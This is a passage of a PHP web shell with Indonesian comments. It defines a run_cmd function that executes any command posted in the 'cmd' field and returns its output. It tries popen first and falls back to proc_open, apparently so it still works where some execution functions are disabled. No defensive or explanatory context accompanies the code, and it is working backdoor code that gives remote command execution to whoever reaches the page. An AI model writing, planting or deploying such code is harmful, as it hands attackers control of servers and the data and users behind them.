            </form>';
        exit;
    }
}

// Eksekusi command
function run_cmd($cmd) {
    $out = '';
    if (function_exists('popen')) {
        $h = popen($cmd . " 2>&1", "r");
        while (!feof($h)) $out .= fread($h, 1024);
        pclose($h);
    } elseif (function_exists('proc_open')) {
        $d = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $p = proc_open($cmd, $d, $pipes);
        if (is_resource($p)) {
            $out .= stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($p);
        }
    } else {
        $out = "Fungsi eksekusi diblokir semua!";
    }
    return $out;
}

$result = '';
if (isset($_POST['cmd'])) {
    $result = run_cmd($_POST['cmd']);
}
